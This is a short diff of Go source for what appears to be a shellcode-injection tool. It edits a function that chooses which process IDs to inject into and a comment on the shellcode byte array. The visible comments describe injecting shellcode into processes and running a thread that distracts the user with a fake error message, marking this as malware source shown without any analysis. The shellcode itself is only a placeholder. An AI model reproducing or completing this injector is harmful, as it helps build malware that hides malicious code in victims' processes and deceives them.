@@ -43,12 +43,15 @@ func getprocname(id uint32) string {
 func check_pid(pid uint32) bool {
     // check if pid evaluates to true or if pid is in targeted_pids slice-
     // return false else return true
-    for _,val := range targeted_pids {
-        if pid == 0 || pid == val {
-            return false
+    if pid > 0 {
+        for _,val := range targeted_pids {
+            if pid == val {
+                return false
+            }
         }
+        return true
     }
-    return true
+    return false
 }
 
 func get_pids() {
@@ -120,7 +123,7 @@ func inject(shellcode []byte, pid uint32) {
 }
 
 func main() {
-    // enter shellcode here in 0x00 format
+    // enter shellcode here in 0x00/num format
     shellcode := []byte{0x00, 0x00, 0x00}
 
     // thread to distract user with inauthentic error message
